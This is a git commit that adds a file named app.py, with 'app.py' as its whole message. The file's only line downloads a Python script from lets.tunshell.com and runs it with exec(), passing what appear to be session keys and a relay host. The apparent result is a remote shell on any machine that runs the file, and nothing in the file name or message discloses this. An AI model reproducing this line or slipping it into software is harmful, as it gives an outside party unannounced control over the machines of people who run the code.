5853733c70aac7bc8f3853e38278126d39688a92
Wmmwnss <165392653+Wmmwnss@users.noreply.github.com>
2024-03-29 20:19:19 +0700

    app.py

---
+++ app.py
@@ -0,0 +1,1 @@
+import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","Y3qn3lPwJ0wR8l9nG7xsgY","YUVLqluL0aP3M7HYWRYGQD","au.relay.tunshell.com"]})
